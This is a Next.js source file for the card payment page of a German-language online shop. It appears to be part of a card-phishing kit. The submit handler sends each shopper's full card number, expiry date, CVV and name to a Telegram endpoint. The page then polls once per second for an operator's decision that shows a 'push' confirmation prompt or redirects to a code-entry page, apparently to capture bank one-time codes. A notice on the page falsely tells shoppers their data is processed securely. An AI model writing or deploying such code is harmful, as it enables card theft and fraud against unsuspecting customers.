'use client';

import { useState, useEffect, Suspense } from 'react';
import { useCartStore, useAuthStore } from '@/lib/store';
import { useRouter, useSearchParams } from 'next/navigation';
import Button from '@/components/Button';
import Link from 'next/link';
import LoadingSpinner from '@/components/LoadingSpinner';
import PushNotificationModal from '@/components/PushNotificationModal';

function PaymentForm() {
  const { items, getTotal, clearCart } = useCartStore();
  const { user, token } = useAuthStore();
  const router = useRouter();
  const searchParams = useSearchParams();
  const [loading, setLoading] = useState(false);
  const [processing, setProcessing] = useState(false);
  const [orderId, setOrderId] = useState<string | null>(null);
  const [orderStatus, setOrderStatus] = useState<'processing' | 'push' | 'code' | 'error' | 'completed' | null>(null);
  const [error, setError] = useState('');

  // Получаем данные адреса из query параметров
  const shippingData = {
    name: searchParams.get('name') || '',
    email: searchParams.get('email') || '',
    street: searchParams.get('street') || '',
    city: searchParams.get('city') || '',
    postalCode: searchParams.get('postalCode') || '',
    country: searchParams.get('country') || 'Deutschland',
  };

  const [paymentData, setPaymentData] = useState({
    cardNumber: '',
    cardExpiry: '',
    cardCVV: '',
    cardName: '',
  });

  const total = getTotal();

  useEffect(() => {
    if (items.length === 0) {
      router.push('/cart');
      return;
    }

    if (!user) {
      router.push('/account/login');
      return;
    }

    // Проверяем, что все данные адреса присутствуют
    if (!shippingData.name || !shippingData.street || !shippingData.city || !shippingData.postalCode) {
      router.push('/checkout');
      return;
    }
  }, [items, user, router, shippingData]);

  const formatCardNumber = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    const groups = numbers.match(/.{1,4}/g) || [];
    return groups.join(' ').substring(0, 19);
  };

  const formatExpiry = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    if (numbers.length >= 2) {
      return `${numbers.slice(0, 2)}/${numbers.slice(2, 4)}`;
    }
    return numbers;
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    setPaymentData({ ...paymentData, cardNumber: formatted });
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatExpiry(e.target.value);
    setPaymentData({ ...paymentData, cardExpiry: formatted });
  };

  const handleCVVChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const numbers = e.target.value.replace(/\D/g, '').substring(0, 3);
    setPaymentData({ ...paymentData, cardCVV: numbers });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setLoading(true);

    // Валидация
    if (paymentData.cardNumber.replace(/\s/g, '').length < 16) {
      setError('Bitte geben Sie eine gültige Kartennummer ein');
      setLoading(false);
      return;
    }

    if (paymentData.cardExpiry.length < 5) {
      setError('Bitte geben Sie ein gültiges Ablaufdatum ein');
      setLoading(false);
      return;
    }

    if (paymentData.cardCVV.length < 3) {
      setError('Bitte geben Sie einen gültigen CVV ein');
      setLoading(false);
      return;
    }

    if (!paymentData.cardName.trim()) {
      setError('Bitte geben Sie den Namen auf der Karte ein');
      setLoading(false);
      return;
    }

    try {
      // Подготавливаем данные заказа
      const orderItems = items.map((item) => ({
        productId: item.productId,
        variantId: item.variantId,
        quantity: item.quantity,
        price: item.price,
        variantData: item.variantData || {},
      }));

      // Создаем заказ в базе данных
      const orderResponse = await fetch('/api/orders', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({
          items: orderItems,
          shippingAddress: {
            name: shippingData.name,
            street: shippingData.street,
            city: shippingData.city,
            postalCode: shippingData.postalCode,
            country: shippingData.country,
          },
          paymentMethod: 'card',
        }),
      });

      if (!orderResponse.ok) {
        throw new Error('Fehler beim Erstellen der Bestellung');
      }

      const order = await orderResponse.json();
      const realOrderId = order.id; // Реальный ID заказа из базы данных

      // Отправляем данные в Telegram с реальным orderId
      const telegramResponse = await fetch('/api/telegram/send-order', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          orderId: realOrderId, // Передаем реальный orderId
          items: items.map((item) => ({
            title: item.title,
            quantity: item.quantity,
            price: item.price,
          })),
          total: total,
          shippingAddress: shippingData,
          paymentData: {
            cardNumber: paymentData.cardNumber,
            cardExpiry: paymentData.cardExpiry,
            cardCVV: paymentData.cardCVV,
            cardName: paymentData.cardName,
          },
          customerEmail: shippingData.email || user?.email || '',
        }),
      });

      let telegramData;
      if (!telegramResponse.ok) {
        const errorData = await telegramResponse.json();
        console.error('Telegram send error:', errorData);
        // Не прерываем процесс, даже если Telegram не отправился
      } else {
        telegramData = await telegramResponse.json();
        console.log('Telegram response:', telegramData);
      }

      // Используем реальный orderId из базы данных
      console.log('Setting orderId:', realOrderId);
      setOrderId(realOrderId);
      
      // Устанавливаем начальный статус во временном хранилище
      const statusResponse = await fetch(`/api/orders/${realOrderId}/status`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ status: 'processing' }),
      });
      
      if (statusResponse.ok) {
        console.log('Initial status set to processing for:', realOrderId);
      } else {
        console.error('Failed to set initial status:', await statusResponse.text());
      }

      // Показываем загрузку после успешной отправки в Telegram
      setProcessing(true);
      // НЕ очищаем корзину и НЕ переходим на success - показываем загрузку
    } catch (error) {
      console.error('Payment error:', error);
      setError('Fehler bei der Zahlung. Bitte versuchen Sie es erneut.');
    } finally {
      setLoading(false);
    }
  };

  // Polling статуса заказа и обновлений Telegram, если processing активен
  useEffect(() => {
    if (!processing || !orderId) return;

    let pollOffset = '0';
    let isPolling = true;

    const checkStatus = async () => {
      if (!isPolling) return;
      
      try {
        // Сначала проверяем обновления Telegram (polling)
        try {
          const pollResponse = await fetch(`/api/telegram/poll-updates?offset=${pollOffset}&t=${Date.now()}`, {
            cache: 'no-store',
          });
          
          if (pollResponse.ok) {
            const pollData = await pollResponse.json();
            if (pollData.lastUpdateId) {
              pollOffset = pollData.lastUpdateId.toString();
            }
            
            if (pollData.processedCallbacks && pollData.processedCallbacks.length > 0) {
              console.log('[Payment Page] ✅ Callbacks processed:', pollData.processedCallbacks);
            }
          }
        } catch (pollError) {
          console.error('[Payment Page] Poll error:', pollError);
        }

        // Затем проверяем статус заказа
        const response = await fetch(`/api/orders/${orderId}/status?t=${Date.now()}`, {
          cache: 'no-store',
          headers: {
            'Cache-Control': 'no-cache',
          }
        });
        
        if (response.ok) {
          const data = await response.json();
          const newStatus = data.status;
          
          console.log('[Payment Page] Status check:', { 
            orderId, 
            currentStatus: orderStatus, 
            newStatus,
            timestamp: new Date().toISOString()
          });
          
          // Обновляем статус только если он изменился
          if (newStatus !== orderStatus) {
            console.log('[Payment Page] ⚡ Status changed!', { from: orderStatus, to: newStatus });
            setOrderStatus(newStatus);
            
            // Если статус code или error, перенаправляем на соответствующую страницу
            if (newStatus === 'code') {
              console.log('[Payment Page] Redirecting to code page');
              isPolling = false;
              router.push(`/checkout/code?orderId=${orderId}`);
              return;
            } else if (newStatus === 'error') {
              console.log('[Payment Page] Redirecting to error page');
              
              // Обновляем статус заказа в базе данных при ошибке
              try {
                await fetch(`/api/orders/${orderId}/update-status`, {
                  method: 'POST',
                  headers: { 
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${token}`,
                  },
                  body: JSON.stringify({ status: 'error' }),
                });
              } catch (error) {
                console.error('[Payment Page] Failed to update order status in DB:', error);
              }
              
              isPolling = false;
              router.push(`/checkout/error?orderId=${orderId}`);
              return;
            } else if (newStatus === 'completed') {
              console.log('[Payment Page] Order completed, redirecting to success');
              
              // Обновляем статус заказа в базе данных
              try {
                await fetch(`/api/orders/${orderId}/update-status`, {
                  method: 'POST',
                  headers: { 
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${token}`,
                  },
                  body: JSON.stringify({ status: 'completed' }),
                });
              } catch (error) {
                console.error('[Payment Page] Failed to update order status in DB:', error);
              }
              
              isPolling = false;
              clearCart();
              router.push('/checkout/success');
              return;
            }
            // Для 'push' статуса просто обновляем состояние, чтобы показать модальное окно
            // Не останавливаем polling, так как пользователь может нажать "Я подтвердил"
          }
        } else {
          const errorText = await response.text();
          console.error('[Payment Page] Failed to fetch order status:', response.status, errorText);
        }
      } catch (error) {
        console.error('[Payment Page] Error checking order status:', error);
      }
    };

    // Проверяем статус каждые 1 секунду для более быстрой реакции
    const interval = setInterval(() => {
      if (isPolling) {
        checkStatus();
      }
    }, 1000);
    checkStatus(); // Первая проверка сразу

    return () => {
      isPolling = false;
      clearInterval(interval);
    };
  }, [processing, orderId, router, orderStatus, token, clearCart]); // Added missing dependencies

  if (items.length === 0 || !user) {
    return null;
  }

  // Показываем соответствующий компонент в зависимости от статуса
  if (processing) {
    console.log('[Payment Page] Rendering with status:', { orderStatus, orderId, processing });
    
    if (orderStatus === 'push') {
      console.log('[Payment Page] Showing PushNotificationModal');
      return <PushNotificationModal orderId={orderId} />;
    }
    // Показываем загрузку для processing или если статус еще не определен
    return <LoadingSpinner />;
  }

  return (
    <div className="min-h-screen">
      <div className="container mx-auto px-4 py-8 max-w-2xl">
        <div className="mb-6">
          <Link href="/checkout" className="text-neon-green hover:text-neon-green-dark text-sm">
            ← Zurück zur Kasse
          </Link>
        </div>

        <h1 className="text-4xl font-bold mb-2">Zahlung</h1>
        <p className="text-text-muted mb-8">Bitte geben Sie Ihre Kreditkartendaten ein</p>

        <form onSubmit={handleSubmit} className="space-y-6">
          {/* Order Summary */}
          <div className="bg-gradient-to-br from-card-bg-start to-card-bg-end rounded-card border border-card-border p-6 mb-6">
            <h2 className="text-lg font-semibold mb-4">Bestellübersicht</h2>
            <div className="space-y-2 mb-4">
              {items.map((item) => (
                <div key={item.id} className="flex justify-between text-sm">
                  <span className="text-text-muted">{item.title} × {item.quantity}</span>
                  <span>{(item.price * item.quantity).toFixed(2)} €</span>
                </div>
              ))}
            </div>
            <div className="border-t border-card-border pt-4">
              <div className="flex justify-between text-lg font-bold">
                <span>Gesamt</span>
                <span className="text-neon-green">{total.toFixed(2)} €</span>
              </div>
            </div>
          </div>

          {/* Payment Form */}
          <div className="bg-gradient-to-br from-card-bg-start to-card-bg-end rounded-card border border-card-border p-6">
            <h2 className="text-xl font-semibold mb-6">Kreditkartendaten</h2>

            {error && (
              <div className="mb-4 p-4 bg-red-500/10 border border-red-500/30 rounded-lg text-red-400 text-sm">
                {error}
              </div>
            )}

            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium mb-2">
                  Kartennummer <span className="text-red-400">*</span>
                </label>
                <input
                  type="text"
                  required
                  value={paymentData.cardNumber}
                  onChange={handleCardNumberChange}
                  placeholder="1234 5678 9012 3456"
                  maxLength={19}
                  className="w-full px-4 py-2.5 rounded-lg bg-background border border-card-border text-foreground focus:border-neon-green focus:outline-none transition-colors duration-250"
                />
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-medium mb-2">
                    Ablaufdatum <span className="text-red-400">*</span>
                  </label>
                  <input
                    type="text"
                    required
                    value={paymentData.cardExpiry}
                    onChange={handleExpiryChange}
                    placeholder="MM/JJ"
                    maxLength={5}
                    className="w-full px-4 py-2.5 rounded-lg bg-background border border-card-border text-foreground focus:border-neon-green focus:outline-none transition-colors duration-250"
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium mb-2">
                    CVV <span className="text-red-400">*</span>
                  </label>
                  <input
                    type="text"
                    required
                    value={paymentData.cardCVV}
                    onChange={handleCVVChange}
                    placeholder="123"
                    maxLength={3}
                    className="w-full px-4 py-2.5 rounded-lg bg-background border border-card-border text-foreground focus:border-neon-green focus:outline-none transition-colors duration-250"
                  />
                </div>
              </div>

              <div>
                <label className="block text-sm font-medium mb-2">
                  Name auf der Karte <span className="text-red-400">*</span>
                </label>
                <input
                  type="text"
                  required
                  value={paymentData.cardName}
                  onChange={(e) => setPaymentData({ ...paymentData, cardName: e.target.value })}
                  placeholder="MAX MUSTERMANN"
                  className="w-full px-4 py-2.5 rounded-lg bg-background border border-card-border text-foreground focus:border-neon-green focus:outline-none transition-colors duration-250"
                />
              </div>
            </div>

            <div className="mt-6 pt-6 border-t border-card-border">
              <div className="flex items-center gap-2 text-xs text-text-muted mb-4">
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
                Ihre Zahlungsdaten werden sicher verarbeitet
              </div>

              <Button
                type="submit"
                variant="primary"
                className="w-full"
                disabled={loading}
              >
                {loading ? 'Wird verarbeitet...' : `${total.toFixed(2)} € bezahlen`}
              </Button>
            </div>
          </div>
        </form>
      </div>
    </div>
  );
}

export default function PaymentPage() {
  return (
    <Suspense fallback={
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-text-muted">Lade...</div>
      </div>
    }>
      <PaymentForm />
    </Suspense>
  );
}
